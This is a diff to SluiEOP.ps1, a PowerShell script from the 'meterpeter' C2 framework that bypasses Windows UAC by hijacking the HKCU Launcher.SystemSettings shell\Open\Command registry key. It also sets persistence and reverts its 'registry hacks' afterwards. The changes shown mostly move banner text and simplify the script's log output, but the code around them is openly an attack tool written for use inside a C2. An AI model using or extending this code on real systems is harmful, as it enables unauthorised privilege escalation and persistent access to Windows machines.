@@ -47,7 +47,7 @@
    None. You cannot pipe objects into SluiEOP.ps1
 
 .OUTPUTS
-   If exec outside meterpeter C2 .. Gets the spawned <arch> <ProcessName> and <PID>
+   Gets the spawned process <arch> <ProcessName> <status> and <PID>
 
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
@@ -74,12 +74,18 @@ If(-not($param1) -or $param1 -eq $null){
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
 If($CheckVuln -eq $True){
 
-   ## Delete EOP 'persistence' (manual)
+   ## For those who run SluiEOP outside meterpeter C2
+   # meterpeter C2 uploads SluiEOP.ps1 to $env:TMP (default)
+   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){
+      Write-Host "SluiEOP v1.8 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+      Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 1000
+   }
+
+   ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
+   #  This function 'reverts' all regedit hacks to the previous state before the EOP.
    If($param1 -eq "deleteEOP"){
       If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){
-         Write-Host "SluiEOP v1.8 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
-         Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 700
-         Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 700
+         Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Seconds 1
       }
       ## Make sure the vulnerable registry key exists
       $CheckHive = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -ErrorAction SilentlyContinue
@@ -94,13 +100,6 @@ If($CheckVuln -eq $True){
          Get-Content -Path "$env:TMP\sLUIEop.log";Remove-Item -Path "$env:TMP\sLUIEop.log" -Force      
       }
       Exit
-   }
-
-   ## For those who run SluiEOP outside meterpeter C2
-   # meterpeter C2 uploads SluiEOP.ps1 to $env:TMP (default)
-   If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){
-      Write-Host "SluiEOP v1.8 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
-      Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 1000
    }
 
    ### Add Entrys to Regedit { using powershell }
@@ -142,7 +141,7 @@ If($CheckVuln -eq $True){
 
    <#
    .SYNOPSIS
-      Helper - Gets the spawned <arch> <ProcessName> <status> and <PID>
+      Helper - Gets the spawned process <arch> <ProcessName> <status> and <PID>
       Author: @r00t-3xp10it
 
    .DESCRIPTION
@@ -230,11 +229,9 @@ If($CheckVuln -eq $True){
       ## Build meterpeter Table
       # For those who run SluiEOP inside meterpeter C2
       If(-not($EOP_Success -eq $True)){
-         echo "   system  execute  '$Command'" > $env:TMP\sLUIEop.log
-         echo "   system  error?   Spawn Process PID not returned" >> $env:TMP\sLUIEop.log
+         echo "   system  error?   Spawn Process PID not returned" > $env:TMP\sLUIEop.log
       }Else{
-         echo "   system  execute  '$Command'" > $env:TMP\sLUIEop.log
-         echo "   system  success  Spawn Process PID returned: $EOPID" >> $env:TMP\sLUIEop.log
+         echo "   system  success  Spawn Process PID returned: $EOPID" > $env:TMP\sLUIEop.log
       }
    }
 
